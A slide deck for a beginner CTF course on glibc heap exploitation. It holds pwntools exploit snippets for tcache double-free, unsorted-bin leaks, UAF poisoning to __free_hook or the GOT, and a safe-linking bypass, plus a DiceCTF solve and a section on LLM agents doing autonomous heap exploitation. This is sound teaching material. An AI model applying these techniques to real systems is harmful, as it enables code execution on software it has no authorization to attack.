# Heap Pwn

### A CTF beginner's course — ~3h05

glibc tcache · double-free · UAF · unsorted-bin leak · `__free_hook`

Shared `heapnote` binary · 4 challenges · live demos

---

# Outline

- **Part I — Concepts** — heap layout, chunks, bins, tcache (glibc 2.27)
- **Part II — The Challenges** — one `heapnote` bug, four escalations
  - C1 tcache double-free -> GOT overwrite
  - C2 unsorted-bin libc leak -> `__free_hook`
  - C3 UAF-Edit poisoning -> `__free_hook` (+ one_gadget)
  - C4 safe-linking bypass (glibc 2.35, stretch)
- **Part III — Agentic pwn heap** — driving an LLM agent with a binary-analysis MCP

---


# Part I — Concepts

Heap layout, chunks, bins, and tcache

---

## 00 — Overview & Agenda

---

## What is heap pwn?

- "Heap pwn" = abusing the dynamic memory allocator (glibc `malloc`/`free`)
  to turn memory-safety bugs into code execution.
- Unlike stack pwn (overwriting return addresses), heap exploits corrupt
  the allocator's own bookkeeping to get **arbitrary read / arbitrary write /
  code-execution primitives**.

---

## Why this tutorial uses glibc 2.27 (Ubuntu 18.04)

| Feature | 2.27 (our target) | 2.35 ("what's next") |
|---|---|---|
| tcache | yes | yes |
| tcache key (double-free detect) | **no** | yes |
| safe-linking (PROTECT_PTR) | **no** | yes |
| `__free_hook` / `__malloc_hook` | **present** | removed (2.34) |

2.27 is the cleanest teaching target: the three beginner techniques
(double-free, unsorted-bin leak, UAF→`__free_hook`) all work directly.
2.35 is the realistic modern target — covered as a stretch (C4).

---

## Agenda

| Time | Segment | Files |
|---|---|---|
| 0:00–0:45 | Concepts: heap layout, chunks, bins, tcache | `01`, `02` |
| 0:45–1:30 | Environment setup (pwntools, pwndbg, patchelf, pinned libcs) | `03` |
| 1:30–2:00 | **C1** double-free→GOT, **C2** unsorted leak→`__free_hook` | `04`, `05` |
| 2:00–2:30 | **C3** UAF→`__free_hook` (+one_gadget), **C4** safe-linking | `06`, `07` |
| 2:30–3:00 | **Real CTF**: `baby_talk` (10 min self-read + 20 min思路/PoC) | `08` |
| 3:00–3:05 | Agentic pwn heap (5 min intro) | `09` |

---

## The shared binary

One `heapnote` program (Add / Delete / Edit / Show). **One bug**:
`delete()` never sets `notes[i] = NULL`. That single line gives us both
**double-free** and **use-after-free** — exploited four different ways.

---

## Reference modules (pwn.college)

- Beginner backbone: [Dynamic Allocator Misuse](https://pwn.college/program-security/dynamic-allocator-misuse)
  — UAF, tcache metadata, safe-linking, overlapping allocations.
- "What's next": [Dynamic Allocator Exploitation](https://pwn.college/software-exploitation/dynamic-allocator-exploitation)
  — glibc 2.35, consolidation, advanced heap exploits (how2heap reference).

---

## 01 — Heap Space Layout & Chunks

---

## The heap in one picture

```
   low addr                                                       high addr
   +---------------------------------------------------------------+
   | chunk | chunk | chunk | ...        ... |        top chunk      |
   +---------------------------------------------------------------+
   ^heap_base                                       ^brk (grows up)
```
- The heap is a contiguous region grown via `brk` (small allocs) or `mmap`
  (large allocs, > `mp_.mmap_threshold` ≈ 128 KB).
- Allocations are carved out of this region; frees return space to the
  allocator's **bins**, not to the OS immediately.

---

## A malloc chunk (x86-64, glibc)

```
      prev_size (8)   <- reused as data of the PREVIOUS chunk when it's in use
      size      (8)   <- chunk size | flags (A|M|P in the low 3 bits)
      user data  ...  <- what malloc() returns (chunk + 0x10)
```
- `malloc(n)` returns `chunk + 0x10`; the 0x10 header is `prev_size` + `size`.
- Minimum chunk size 0x20; alignment 0x10. Sizes are rounded up.
- Flags: **P** = previous chunk in use, **M** = mmap'd, **A** = non-main arena.

---

## The bins (where freed chunks live)

| Bin | Holds | Size range |
|---|---|---|
| **tcache** | thread-local cache, singly-linked | 0x20–0x410 (per size) |
| **fastbin** | singly-linked, LIFO | 0x20–0x80 (default) |
| **unsorted bin** | doubly-linked, FIFO | any (overflow/triage) |
| **small bin** | doubly-linked, size-indexed | 0x20–0x3f0 |
| **large bin** | doubly-linked, size-ranged | >= 0x400 |

Key idea: a freed chunk's **fd/bk pointers are stored in the chunk's user
data area**. That is the whole game — if you can read or write a freed
chunk's data, you are reading/writing the allocator's linked-list pointers.

---

## See it live (pwndbg)

```
gdb ./heapnote
pwndbg> break main
pwndbg> run
pwndbg> heap            # list all chunks
pwndbg> vis_heap_chunks # ascii map of the heap
```

---

## 02 — tcache (the beginner's whole game)

---

## What tcache is

- **Thread-local caching layer** added in glibc 2.26.
- Each thread has a `tcache_perthread_struct` with:
  - `counts[64]`  — how many chunks per bin
  - `entries[64]` — head pointer of each bin's singly-linked list
- 64 bins, bin `i` holds chunk size `0x20 + i*0x10`. So the **largest tcache
  chunk is 0x410** (request up to 0x408). Anything bigger skips tcache.

---

## The freed-chunk layout in tcache

```
      prev_size | size | fd(next)   <-  fd is in the user-data area!
```
- On free, glibc writes `chunk->fd = tcache->entries[idx]` and
  `tcache->entries[idx] = chunk`. LIFO stack.
- `counts[idx]++`. On malloc, pop the head, `counts[idx]--`.

---

## Why 2.27 is the easy mode

- **No tcache key** (added in 2.29): freeing the same chunk twice just
  makes `fd` point at itself — a **self-loop**. No check fires.
- **No safe-linking** (added in 2.32): `fd` is the raw next pointer, not
  obfuscated.
- `tcache_get()` does **not** check the chunk size — so a poisoned `fd`
  can point **anywhere** (GOT, BSS, libc) and malloc returns it verbatim.
  This is the primitive behind C1, C2, C3.

---

## The two bugs we exploit (both from the ONE missing `NULL`)

1. **Double-free**: `del(0); del(0)` — same chunk in the list twice.
2. **Use-after-free**: `del(0); edit(0, ...)` — write a freed chunk's `fd`;
   `del(0); show(0)` — read a freed chunk's `fd` (leak).

---

## See it live (pwndbg)

```
pwndbg> tcache            # the tcache_perthread_struct + each bin
pwndbg> bins              # all bins incl. unsorted
pwndbg> tcache 0x20       # chunks in the 0x20 tcache bin
pwndbg> heap chunks       # chunk table
```

---

## 03 — Pwn Environment Setup

---

## The toolchain (all local — no Docker)

| Tool | Install | Use |
|---|---|---|
| **pwntools** | `pip install --user pwntools` | exploit scripting, `process()`, `p64`, `ELF` |
| **pwndbg** | `git clone https://github.com/pwndbg/pwndbg && ./setup.sh` | GDB plugin: `heap`, `bins`, `tcache`, `vis_heap_chunks` |
| **one_gadget** | `gem install one_gadget` | find `execve("/bin/sh")` gadgets in libc |
| **seccomp-tools** | `gem install --user-install seccomp-tools` | inspect seccomp sandbox |
| **ROPgadget** | `pip install ROPgadget` | (auxiliary) ROP search |
| **patchelf** | `apt install patchelf` | bind a binary to a chosen libc/ld |
| **gcc / dpkg / curl** | `apt install build-essential dpkg curl` | compile heapnote, fetch pinned libcs |

This whole course runs on your host — no container. One `make setup` fetches
the pinned libcs; `make all` builds both targets.

---

## pwndbg heap commands (memorize these)

```
heap                 # list chunks
heap chunks          # table of all chunks
bins                 # all bins (fast/unsorted/small/large)
tcache               # the tcache struct + per-bin lists
vis_heap_chunks      # ASCII map (the most useful one)
```

---

## The two libcs we pin (and why exactly these builds)

| Challenge | glibc | Ubuntu package | Why this build |
|---|---|---|---|
| C1–C3 | 2.27 | `libc6 2.27-3ubuntu1` (18.04 **GA**) | the original GA build has **no tcache key** → the double-free self-loop works. ⚠ Ubuntu *backported* the tcache double-free check into `2.27-3ubuntu1.2+` (e.g. `1.6`); those builds print `free(): double free detected in tcache 2` and abort. We pin the GA on purpose. |
| C4 | 2.35 | `libc6 2.35-0ubuntu3.14` (22.04) | safe-linking (PROTECT_PTR) stretch target. `__free_hook`/`__malloc_hook` were removed in 2.34. |

These are fetched as **signed `.deb` packages straight from the Ubuntu archive**
(no third-party repo, no scripts): `setup.sh` downloads them with `curl` and
extracts with `dpkg -x` — exactly what `apt download` does.

> **Switching libc is itself a teaching moment.** C1–C3 vs C4 differ only in
> which pinned libc the binary is bound to. The same `heapnote.c` source becomes
> a 2.27 target or a 2.35 target by building against a different libc.

---

## Switching libc = two independent steps (the mental model)

A binary's relationship to libc lives on **two layers**, decided at different
times by different tools. Most "just patchelf it" confusion comes from
conflating them.

| Layer | What it decides | Where it lives | Who sets it |
|---|---|---|---|
| ① **runtime binding** | which `ld.so` + `libc.so.6` actually loads | `.interp` + `DT_RUNPATH` | **patchelf** (or `-Wl,--dynamic-linker`/`-rpath` at link time) |
| ② **link-time requirements** | which `GLIBC_x.y` symbol versions the binary *declares it needs* | `.gnu.version_r` | the `crt1.o` the linker pulls in — baked in, read-only afterward |

patchelf only touches ①. It can **lower** ② never. So:

- **patchelf is enough** ⇔ the binary's required versions ≤ what the target
  libc provides (e.g. it was built on an equal-or-older glibc).
- **you must re-link with the target's `crt1.o`** ⇔ the binary was linked by a
  *newer* crt than your target. The classic trap: glibc 2.34 changed
  `__libc_start_main` to `@@GLIBC_2.34`, so a binary linked on a 2.34+ host
  requires `GLIBC_2.34` even if it only calls `printf`. Point that at a 2.27
  libc and the 2.27 loader prints `version GLIBC_2.34 not found` and dies —
  no amount of patchelf removes that, it's read-only in the binary. (`readelf
  -V ./heapnote | grep GLIBC` shows this table directly.)

That's exactly why this course links `heapnote` against a **2.27 sysroot**
(step ②, dropping the requirement to `GLIBC_2.2.5`) **and** pins the
interpreter+rpath to `glibc-2.27/` (step ①). The Docker setup got away with
patchelf alone only because the container's gcc *was* the 2.27 toolchain, so
step ② was already satisfied.

---

## Building against the pinned 2.27 (the subtle part)

On a 2.35 host, a plain `gcc heapnote.c` links the **host's `crt1.o`**, which
requires `__libc_start_main@@GLIBC_2.34` — a version the 2.27 libc doesn't
have, so the binary segfaults under 2.27 (layer ② from the previous page).

Fix: link against a **2.27 sysroot** so the binary's startup only needs
`GLIBC_2.2.5`. The 2.35 target needs no sysroot — the host's crt already
matches 2.35, so a plain compile + patchelf suffices. Exact flags live in the
Makefile; `setup.sh` builds the sysroot from the `libc6` / `libc6-dev` debs.

---

## One-time setup + build

```bash
cd challenges
make setup     # fetch pinned .debs -> glibc-2.27/ glibc-2.35/ sysroot-2.27/
make all       # -> heapnote (2.27) + heapnote_235 (2.35)
```

Sanity check: `./glibc-2.27/ld-2.27.so --list ./heapnote` should resolve
`libc.so.6` to `./glibc-2.27/`, and `readelf -V ./heapnote | grep GLIBC`
should show only `GLIBC_2.2.x` (no `GLIBC_2.34`).

---

## Patching a binary to a specific libc (the daily CTF workflow)

The general recipe (layer ① from two pages up):

1. Get the matching `libc.so.6` + `ld-linux...so.2` (fetch the `.deb`, or grab
   them off the remote server's `/lib`).
2. `patchelf --set-interpreter ./glibc-2.27/ld-2.27.so --set-rpath ./glibc-2.27 ./heapnote` to bind it.
3. **Gotcha:** the rpath dir must contain a `libc.so.6` symlink → the real
   `libc-X.so`, or the loader silently falls back to your *host* libc (a
   2.27-ld + 2.35-libc Frankenstein that crashes). `setup.sh` makes it for you.

Only layer ①. If the binary also requires a newer `GLIBC_x.y` than the target
has (layer ②), patchelf alone won't save you — re-link against the target's
crt as above.

---

## Stuck on a different libc version? → how2heap

glibc heap internals change across versions: tcache key (2.29), safe-linking
(2.32), hook removal (2.34), ... When you face a libc you haven't exploited
before, **search [how2heap](https://github.com/shellphish/how2heap)** —
shellphish's canonical collection of working heap-exploit PoCs, one file per
technique per glibc version. Browse the directory matching your libc version
and read the corresponding `.c` to see the exact primitive (double-free, tcache
poisoning, house-of-X, safe-linking bypass, ...). Every `exp.py` in this course
is a hand-stripped, commented version of the matching how2heap technique.

---

## Alternative: pwn.college dojo

- The pwn.college "dojo" gives you a prebuilt VM with the exact challenge
  glibc and a flag-checker. Great for self-study; this course instead runs
  fully on your host laptop so everything is inspectable with your own pwndbg.

---

## Pre-flight checklist before any demo

```
checksec ./heapnote                       # confirm: No PIE, Partial RELRO
./glibc-2.27/ld-2.27.so --list ./heapnote # libc.so.6 => ./glibc-2.27/...
file  ./heapnote                          # x86-64, dynamically linked
python3 c1_double_free/exp.py              # expect: shell, then `cat flag.txt`
```

---

# Part II — The Challenges

One bug, four escalations · glibc 2.27 (+ 2.35 stretch)

---

## 04 — C1: tcache double-free → poisoning → GOT overwrite

---

## Goal

No leak. No libc. Just the heap bug + `-no-pie`. Overwrite `free@GOT` with
`&win`, then call `free` → shell.

---

## The bug (the whole course in one line)

```c
void del(int i){ free(notes[i]->data); free(notes[i]); /* BUG: no NULL */ }
```
`notes[i]` is never cleared → `del(0); del(0)` frees the same chunk twice.

---

## Step 1 — the double-free makes a self-loop

On 2.27 (no tcache key), freeing chunk A twice:
```
free A :  head -> A           (A->fd = NULL)
free A :  head -> A -> A ...  (A->fd = A)   counts = 2
```

---

## Step 2 — poison the fd

`malloc` #1 returns A. We write `&free@GOT` into A's data — which **is**
A's `fd`. Now the list is `head -> A -> &free@GOT`.

---

## Step 3 — the 3-malloc rule

```
malloc #1 : returns A          -> write &free@GOT into A (poison fd)
malloc #2 : returns A again     -> dummy (drains the self-loop)
                                head now = &free@GOT
malloc #3 : returns &free@GOT  -> write &win there
```
Why #2 returns A again: after #1, `head` still pointed at A (it was set to
`A->fd = A` *before* we returned A and edited it). The poisoned `fd` only
takes effect for #3.

---

## Step 4 — trigger

`del(any live note)` → `free()` PLT → GOT → `win()` → `system("/bin/sh")`.

---

## Live demo

```
cd challenges && python3 c1_double_free/exp.py
$ cat flag.txt
```

---

## pwndbg view (what to show on screen)

```
pwndbg> tcache          # before: 0x20 bin has counts=2, A->A self-loop
pwndbg> tcache          # after malloc #1: A-> &free@GOT
pwndbg> got             # after malloc #3: free -> win
```

---

## Takeaways

- Double-free = a corrupted linked list you control.
- `tcache_get` does **not** check chunk size → poisoned fd → arbitrary write.
- `-no-pie` makes GOT/win addresses static → no leak needed.

---

## 05 — C2: unsorted bin libc leak → `__free_hook` → system

---

## Goal

Defeat ASLR: leak libc base, then overwrite `__free_hook` with `system`
and `free("/bin/sh")`.

---

## Step 1 — get a chunk OUT of tcache

tcache only holds sizes 0x20–0x410. Request **0x418** → 0x420 chunk → tcache
won't take it. On `free`, it lands in the **unsorted bin**.
```
add(0, 0x418, ...)   # 0x420 chunk
add(1, 0x18, ...)    # GUARD so chunk 0 does not merge into top
del(0)               # -> unsorted bin
```

---

## Step 2 — the leak

A freed unsorted-bin chunk's `fd`/`bk` point at the bin head. On 2.27
x86-64 that address is **`main_arena + 96`**.
- `main_arena = __malloc_hook + 0x10`
- → `libc_base = leak − (main_arena + 96)`

UAF-read it: `show(0)` prints the freed chunk's data (its `fd`).
```python
leak = u64(show(0)[:8])
libc.address = leak - (libc.symbols['__malloc_hook'] + 0x10) - 96
```
All offsets read from the shipped libc at runtime → robust to 2.27
sub-version differences.

---

## Step 3 — tcache poisoning (UAF-Edit vector)

We need `counts >= 2` to pop victim-then-target:
```
add(2,0x68); add(3,0x68); del(2); del(3)   # counts=2, head=3->2
edit(3, 8, p64(__free_hook))              # UAF: head's fd -> __free_hook
add(4,0x68,"PAD")                         # malloc #1 = chunk-3
add(5,0x68, p64(system))                  # malloc #2 = __free_hook, write system
```

---

## Step 4 — trigger

```
add(6, 0x68, "/bin/sh\0")
del(6)                  # free(ptr) -> __free_hook(ptr) -> system("/bin/sh")
```
`__libc_free` calls `hook(ptr, caller)` (2 args); `system` reads only
`rdi` → the extra `rsi` is harmless.

---

## Live demo

```
cd challenges && python3 c2_unsorted_leak/exp.py
$ cat flag.txt
```

---

## pwndbg view

```
pwndbg> bins          # note the 0x420 chunk in the unsorted bin
pwndbg> bins          # after poisoning: 0x70 tcache bin -> __free_hook
pwndbg> p &__free_hook # confirm value == system
```

---

## Takeaways

- Size > tcache max → unsorted bin → libc pointer leak.
- `main_arena+96` is the canonical 2.27 leak target.
- `__free_hook` = the cleanest 2.27 hijack target (gone in 2.34).

---

## 06 — C3: UAF-Edit poisoning → `__free_hook` (+ one_gadget)

---

## Same goal as C2, better primitive

C2 reused the **double-free** to poison. C3 does it with a **single**
use-after-free + Edit — no double-free at all.

---

## Why this matters

- 2.29 added a **tcache key** that detects double-frees. The C1/C2 vector
  trips it on modern glibc.
- UAF-Edit only frees **once**, then edits the dangling pointer → **no
  double-free signature**. This generalizes to 2.29+ (and, with safe-linking
  handling, to 2.32+ — see C4).

---

## The count rule (the one subtlety)

`tcache_get` requires `counts[idx] > 0`. To pop victim-then-target we need
`counts >= 2`. So we free **two distinct** chunks (not the same one twice):
```
add(2,0x68); add(3,0x68); del(3); del(2)   # head=2->3, counts=2, NO double-free
edit(2, 8, p64(__free_hook))              # UAF: head's fd -> __free_hook
add(4,0x68,"PAD")                         # malloc #1 = chunk-2
add(5,0x68, p64(system))                  # malloc #2 = __free_hook
```
Then `add(6,0x68,"/bin/sh\0"); del(6)` → shell.

---

## one_gadget alternative

Instead of `system` + `"/bin/sh"`, write a single `execve("/bin/sh")`
gadget into `__free_hook` (or `__malloc_hook`):
```bash
one_gadget glibc-2.27/libc-2.27.so
# 0x4f2c5  [rsp+0x40]  == NULL
# 0x4f322  [rsp+0x40]  == NULL
# 0x10a38c [rsp+0x70] == NULL
```
- Pros: no need to place `"/bin/sh"` anywhere.
- Cons: **constraint-dependent** — the gadget only fires if the named
  stack slot is NULL at trigger time. The instructor must pre-test which
  gadget works from the menu's call path. `system`+`"/bin/sh"` is the
  reliable default; one_gadget is the "fancy alternative".

In `exp.py`, flip `USE_ONE_GADGET = True` and paste a pre-tested gadget.

---

## Live demo

```
cd challenges && python3 c3_uaf_poison/exp.py
$ cat flag.txt
```

---

## Takeaways

- UAF-Edit subsumes double-free for poisoning, with fewer detection risks.
- The tcache `counts` field is the gating constraint — plan your frees.
- one_gadget = powerful but flaky; always pre-test in-context.

---

## 07 — C4 (stretch): safe-linking bypass on glibc 2.35

---

## What changed at 2.32

glibc added **safe-linking** (PROTECT_PTR). The tcache `fd` is no longer
the raw next pointer:
```
stored_fd = PROTECT_PTR(&fd_slot, next)
          = (&fd_slot >> 12) XOR next
```
where `&fd_slot` is the address of the `fd` field (the chunk's user data).

To poison `fd` to point at a target `T`, you must now write:
```
(&fd_slot >> 12) XOR T
```
…which requires knowing `&fd_slot >> 12` — i.e. a **heap-page leak**.

---

## What changed at 2.34 (the bigger wall)

`__free_hook` and `__malloc_hook` were **removed**. The C2/C3 finisher is
gone. Modern targets include: the tcache `perthread_struct` key/count,
`__exit_funcs` / TLS `dtor_list`, `__printf_function_table`, IO_FILE
vtables (`FSOP`). All are materially harder than a hook overwrite.

---

## The heap-page leak (the easy part of C4)

If a chunk is the **only** entry in a tcache bin, its real `next` is NULL,
so `stored_fd = (&fd >> 12) XOR 0 = &fd >> 12`. A UAF-read leaks exactly
the value we need:
```python
del(2)                    # only entry in its bin
prot_fd = u64(show(2)[:8])
heap_page = prot_fd        # == &fd >> 12
```

---

## Forging a protected pointer

```python
def protect_ptr(fd_slot_addr, target):
    return (fd_slot_addr >> 12) ^ target

forged = protect_ptr(fd_slot_addr, target)
edit(chunk, 8, p64(forged))   # the next malloc returns `target`
```

---

## This stretch challenge's scope

Hooks are gone on 2.35, so the C2/C3 one-shot finisher doesn't exist. But
heapnote is -no-pie + partial RELRO (writable GOT), so we reuse C1's
finisher — GOT overwrite — on top of the safe-linking bypass and DO get a
shell:

1. unsorted-bin libc leak (same as C2),
2. heap-page leak via a singly-freed tcache chunk (defeats safe-linking),
3. forge fd = PROTECT_PTR(&fd, puts@GOT) → malloc returns puts@GOT → write
   &win → next menu() puts() → win() → system("/bin/sh").

One 2.34+ subtlety: `tcache_get()` zeroes `returned_ptr+8` (`e->key=0`), so we
target `puts@GOT` (its +8 neighbour `write@GOT` is never called in the menu
path), not `free@GOT` (whose +8 is `puts@GOT`, which `menu()` would call and
crash). `win()` uses `system@GOT`, which we leave untouched, so it still fires.

Honest framing: this is a shell because heapnote hands us a writable GOT. A
real 2.35 target (full RELRO, no `win()`) needs the structural finishers —
FSOP / **House of Apple** (fake an `_IO_FILE` + a vtable inside the validated
range), `exit_funcs` / TLS `dtor_list` (gated by `PTR_MANGLE` → also leak the
pointer guard), `__printf_function_table` (House of Husk). That's the
"what's next".

---

## Live demo

```
cd challenges && python3 c4_safe_linking/exp.py
```
(watch the heap-page leak, the PROTECT_PTR'd fd → `puts@GOT`, then the GOT
overwrite — the next `menu()` `puts()` pops a shell; `cat flag.txt`)

---

## Where to go next

- pwn.college [Dynamic Allocator Exploitation](https://pwn.college/software-exploitation/dynamic-allocator-exploitation)
  (glibc 2.35, consolidation, advanced primitives).
- [how2heap](https://github.com/shellphish/how2heap) — `safe_linking.c`,
  `tcache_stashing_unlink.c`, `house of *` variants.
- Practice: re-do C1–C3 on a 2.31, then 2.35 build, adapting each step.

---

## Takeaways

- Safe-linking adds a heap-leak dependency, not an impassable wall.
- Hook removal (2.34) kills the one-shot finisher: with a writable GOT you
  fall back to C1-style GOT overwrite; with full RELRO you need FSOP /
  House of Apple / exit_funcs (structural, sometimes a pointer-guard leak).
- Leaking heap + libc is now step 0 of any modern tcache exploit.

---

## 08 — Real CTF: `baby_talk` (DiceCTF 2024) — 30 min

A real, in-the-wild challenge that chains the exact techniques from C1–C3.
This is the "put it together" capstone before the agentic stretch.

Source / files: `challenges/baby_talk/` (`binary`, `libc.so.6`,
`ld-linux-x86-64.so.2`, `flag.txt`, `solve.py`).
Upstream: [dicegang/dicectf-quals-2024-challenges/pwn/baby-talk](https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/pwn/baby-talk).

---

## Segment plan (30 min)

- **0–10 min — students read** the challenge cold. Open `binary` in pwndbg,
  run it, map the three menu ops (`str` / `tok` / `del`), find the bug
  themselves. No hand-holding — this is the transfer test.
- **10–30 min — walkthrough + live PoC**: the bug, the leak chain, the
  overlap trick, the `__free_hook` finish, then run `solve.py` live.

---

## The binary

Full RELRO, PIE, canary, NX. glibc 2.27-3ubuntu1.6 (shipped). Menu:

```
1. str   — malloc(user size), read data, store pointer in a global table
2. tok   — strtok(str, delim); print each token with puts
3. del   — free(table[idx])    ← pointer NOT nulled
4. exit
```

**The bug**: `del` frees without clearing the table entry → UAF + the
`strtok` in-place null write gives a targeted single-byte overwrite with no
overflow. Two primitives, one missing NULL, same family as `heapnote`.

---

## How it maps to C1–C3 (the whole point of this slot)

| heapnote chapter | `baby_talk` does the same idea... |
|---|---|
| **C1** tcache double-free → poison fd | fill/drain the 0xf8 tcache bin; overlap later lets you overwrite a tcache fd to a chosen address |
| **C2** unsorted-bin libc leak | reuse a freed 0xf8 chunk still carrying an unsorted-bin pointer; `tok`+`puts` leaks it → libc base |
| **C3** `__free_hook` + `system("/bin/sh")` | poison tcache so a 0x18 alloc returns `__free_hook`; write `system`; free a `"/bin/sh"` chunk |
| **C4** safe-linking | (not here — 2.27 has bare fd, no PROTECT_PTR; this is the *easy-mode* counterpart) |

The novel twist that makes it a *real* challenge rather than a textbook
`heapnote`: `strtok` writes `\0` over any byte it treats as a delimiter, so a
delimiter chosen *inside chunk metadata* gives a null-byte corruption → forge
fake prev-size/size → backward consolidation → overlapping chunk → tcache fd
overwrite. No buffer overflow involved.

Full RELRO also forces the `__free_hook` route (no GOT write) — the realistic
mirror of C1's partial-RELRO GOT overwrite.

---

## Leak 1 — heap base (tcache fd residual)

Free adjacent 0xf8 chunks, reallocate one with a short string, then `tok` with
a delimiter that stops after your controlled prefix. `puts` prints your prefix
followed by residual tcache fd bytes → recover the page-aligned heap base.

## Leak 2 — libc base (unsorted-bin residual)

Free a large 0xf8 chunk so it lands in the unsorted bin (fill tcache first),
reuse it with a short prefix, `tok`+`puts` → the fd still holds an
`main_arena`-area pointer → `libc.address = leak - 0x3EBE41` (offset for the
shipped 2.27 build).

## Overlap — the `strtok` null-byte trick

Shape the heap, then `tok` with a delimiter byte that sits inside a
neighbouring chunk's size field. The `\0` shrinks the recorded size, so a later
free does backward consolidation into attacker-shaped fake metadata → one
allocation now overlaps another → overwrite a live tcache fd.

## Finish — tcache poison → `__free_hook`

```python
# overlap wrote a fake 0x20 tcache chunk with fd -> __free_hook
do_str(io, 0xF8, b"X"*0x18 + p64(0x21) + p64(libc.sym["__free_hook"]))
binsh = do_str(io, 0x18, b"/bin/sh")            # pop poisoned chunk; head now = __free_hook
do_str(io, 0x18, p64(libc.sym["system"]))       # alloc at __free_hook, write system
do_del(io, binsh)                               # free("/bin/sh") -> system("/bin/sh")
```

## Live demo

```bash
cd challenges/baby_talk
python3 solve.py        # pops a shell, cat flag.txt
# flag: dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}
```

Verified locally against the shipped `libc.so.6` + `ld`, no Docker.

---

## Takeaways

- A real 2.27 challenge = C1+C2+C3 with one extra trick (the `strtok`
  null-byte) and one harder constraint (Full RELRO → `__free_hook`, not GOT).
- The leak-then-poison-then-hook skeleton is *the* heap pwn template; once you
  see it, most beginner/intermediate challenges are the same shape.
- When the binary has no overflow but a destructive parser (`strtok`,
  `memcpy` with user len, etc.), the parser *is* the write primitive.

---

# Part III — Agentic Pwn

Driving an LLM agent to do heap pwn

---

## 09 — Agentic Pwn Heap (5 min intro)

> **Presenter note:** this is a 5-minute teaser, not a lecture. Cover *The
> pitch* + *The loop that works* only; the AEG lineage, ExploitGym/Bench/AIxCC
> details, and the good/bad table below are **reference material** for
> self-study, not slides to walk through live.

---

## The pitch

Can an LLM agent actually *solve* a heap pwn challenge? In 2024–2026 the
answer moved from "no" to "sometimes, with the right loop." This segment
is a 5-minute tour of the frontier.

---

## The loop that works

```
        +--------------------+
        |  agent (Claude)    |
        +--------------------+
   read |                    | send actions
  binary|  binary-analysis   | (run binary, gdb, pwntools)
  xrefs |  MCP + gdb/pwntools|
        +--------------------+
                ^
                | feed pwndbg output (heap/bins/tcache) back as context
                |
        +--------------------+
        |   target binary    |
        +--------------------+
```
The agent never "sees" memory directly. It reasons from **decompiled code**
(MCP) and **debugger output** (fed back into context), then emits the next
pwntools action. Heap pwn is hard for agents because the state is large
and invisible without the right `pwndbg` dumps at each step.

---

## Before LLMs: traditional AEG (the lineage)

Autonomous exploitation predates LLMs by ~15 years. **AEG** (Automatic
Exploit Generation) = symbolic execution + constraint solving to *find* a
memory-corruption bug and *synthesize* a working exploit (input + payload)
from it — no human in the loop.

- **AEG** (NDSS 2011): coined the term — from a vulnerability, auto-derive
  the crashing input and a working exploit payload.
- **Mayhem** (IEEE S&P 2012, *"Unleashing Mayhem on Binary Code"*): hybrid
  symbolic + concrete execution at binary scale → ForAllSecure →
  **won the 2016 DARPA Cyber Grand Challenge (CGC)**.
- **HeapHopper** (USENIX Security 2018): bounded model checking over
  sequences of heap operations (`malloc` / `free` / overflow / UAF /
  double-free / fake-free) to automatically find which sequences yield an
  exploitation primitive (arbitrary write, overlapping allocation). Caught
  a real tcache weakness in glibc 2.26.
  *AEG for the heap — the exact primitives you'll use today.*
- **MAZE** (USENIX Security 2021): automates "heap feng shui" — the
  grooming step before exploitation — by modeling layout manipulation as a
  Linear Diophantine Equation and solving it to place objects where an
  exploit needs them.

Symbolic AEG is alive and has gotten *more* heap-focused: recent top-tier
work like **SCATTER** (USENIX Security 2023, manipulation-distance-guided
fuzzing for exploitable heap layouts) and **BAGUA** (NDSS 2023, ILP-based
precise heap-layout manipulation) extends automated heap grooming to
general-purpose programs. But since ~2024 a **complementary** LLM/agentic
axis has opened — the AIxCC, ExploitGym, ExploitBench efforts below — in
which an agent *reasons* about the heap instead of exhaustively solving
constraints. Constraint-driven and language-driven are two axes, not a
succession: today's strongest work often combines them.

---

## The frontier — three efforts to know

### [ExploitGym](https://www.cybergym.io/exploitgym/)
- **Breadth-oriented, CVE-driven benchmark** for exploit agents.
- Tasks span real CVEs across binaries, with 3 difficulty tiers.
- Good for measuring *coverage* (can the agent solve many distinct bugs?).

### [ExploitBench](https://exploitbench.ai/)
- **Depth-oriented**; centered on V8 / browser-engine exploitation.
- Staged scoring: an agent gets credit per exploitation stage reached
  (leak → OOB → code-exec → sandbox escape).
- MCP-native: designed to be driven by tool-calling agents directly.

### DARPA AIxCC (AI Cyber Challenge)
- DARPA's successor to the 2016 CGC (which Mayhem won): AI systems
  autonomously find & patch CVEs.
- Demonstrated at DEF CON; seeded with legacy+modern CVEs.
- Sets the "can agents do this competitively?" benchmark the others measure
  against.

> Note: these projects move fast — exact task counts, prize figures, and
> arXiv IDs change. Treat the above as the landscape map, not a snapshot.

---

## What agents are good / bad at (heap pwn specifically)

| Good | Bad |
|---|---|
| Reading decompiled C, finding the UAF/double-free | Tracking invisible heap state across many frees |
| Writing a clean pwntools skeleton | Knowing which `one_gadget` constraint will fire |
| The libc-offset arithmetic | The 3-malloc-rule subtleties (off-by-one in reasoning) |
| Explaining the exploit | Reliably landing a flaky primitive live |

---

## Practical recipe for running your own agent on a heap challenge

1. Give it the binary via a binary-analysis MCP (load + info + functions).
2. Give it a `pwntools` harness skeleton and a `pwndbg` cheat sheet.
3. At each step, require it to paste the `vis_heap_chunks` / `tcache`
   output into its reasoning before deciding the next action.
4. Cap iterations; have it checkpoint a working partial exploit.

---

## Takeaways

- Agents + MCP binary-analysis + a debugger feedback loop = a real
  (if junior) pwn teammate today.
- ExploitGym/ExploitBench/AIxCC are where the field measures progress.
- For beginners: the agentic loop is best used as a **tutor** (explain my
  exploit, suggest next steps) before it is an autonomous solver.

---

# Thank you

Slides + challenges + `exp.py` in the repo.  

Reference: [pwn.college](https://pwn.college) · [how2heap](https://github.com/shellphish/how2heap)
